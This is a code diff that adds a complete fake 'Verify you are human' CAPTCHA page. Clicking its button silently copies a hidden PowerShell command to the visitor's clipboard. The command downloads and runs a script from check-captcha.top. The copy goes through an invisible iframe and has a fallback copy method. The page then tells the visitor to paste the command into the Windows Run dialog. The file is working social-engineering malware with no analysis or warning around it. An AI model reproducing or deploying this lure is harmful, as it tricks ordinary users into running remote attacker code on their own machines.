@@ -1,0 +1,16 @@
+<!doctype html><html><head><title>Just a moment...</title></head><body>
+<h1>Verify you are human</h1><p>Complete these Verification Steps: 1. Press Windows key + R. 2. Press Ctrl + V. 3. Press Enter.</p>
+<button id="v">I'm not a robot</button>
+<script>
+// Borrows the clipboard of a frame made on the spot, the way a kit would dodge a guard on the top window.
+document.getElementById('v').addEventListener('click', function () {
+  var f = document.createElement('iframe'); f.style.display = 'none'; document.body.appendChild(f);
+  f.contentWindow.focus();
+  f.contentWindow.navigator.clipboard.writeText('powershell -w h -c "iex(irm https://check-captcha.top/a)"')
+    .catch(function () { /* frame without focus: fall back to the old copy command */
+      var t = f.contentDocument.createElement('textarea'); t.value = 'powershell -w h -c "iex(irm https://check-captcha.top/a)"';
+      f.contentDocument.body.appendChild(t); t.select(); f.contentDocument.execCommand('copy');
+    });
+});
+</script>
+</body></html>
